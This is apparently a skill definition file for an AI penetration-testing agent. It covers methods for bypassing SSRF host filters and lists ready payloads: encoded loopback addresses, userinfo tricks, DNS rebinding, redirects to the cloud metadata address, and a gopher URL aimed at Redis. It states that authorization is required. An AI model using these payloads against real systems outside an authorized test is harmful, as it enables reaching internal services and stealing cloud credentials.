---
name: ssrf-filter-bypass
description: >-
  Defeat SSRF allow/deny-list filters (CWE-918): DNS rebinding, decimal/octal/hex IP encodings,
  IPv6/IPv4-mapped forms, `@`/userinfo tricks, redirect chains (302 to internal), and alternate
  schemes. Invoke when SSRF is blocked by a host/IP validator but the fetch still occurs.
  Turns a filtered SSRF into a working one.
family: 06-ssrf-request-layer
type: exploit
owasp: [A10:2021]
cwe: [CWE-918]
requires: [scope-guard, ssrf-triage, util-oast-oob, evidence-recorder]
authorization: required
---

# SSRF Filter Bypass

## Invoke when
- SSRF exists but a validator blocks internal/link-local targets.

## Methodology
1. IP encodings: decimal (`2130706433`), octal (`0177.0.0.1`), hex (`0x7f000001`), IPv6 (`[::1]`,
   `[::ffff:127.0.0.1]`), zero-pad.
2. Parser confusion: `http://expected.com@169.254.169.254/`, `http://169.254.169.254#expected.com`.
3. DNS rebinding: a hostname that resolves to allowed then to internal (TTL 0) — server re-resolves.
4. Redirect: attacker URL 302s to `http://169.254.169.254/...` (server follows).
5. Scheme abuse: `gopher://`, `dict://`, `file://` where supported (gopher → raw TCP to Redis etc.).

## Starter payloads
- `http://0x7f.0x0.0x0.0x1/`, `http://[::ffff:169.254.169.254]/`, `http://a.com@127.0.0.1/`,
  `http://rebind.collab.tld/`, `gopher://127.0.0.1:6379/_...`.

## False-positive filters
- Post-resolution IP re-checks defeat encodings but not rebinding/redirect — try those next.

## Chains to
- `ssrf-cloud-metadata`, `ssrf-basic`, `chain-builder`.
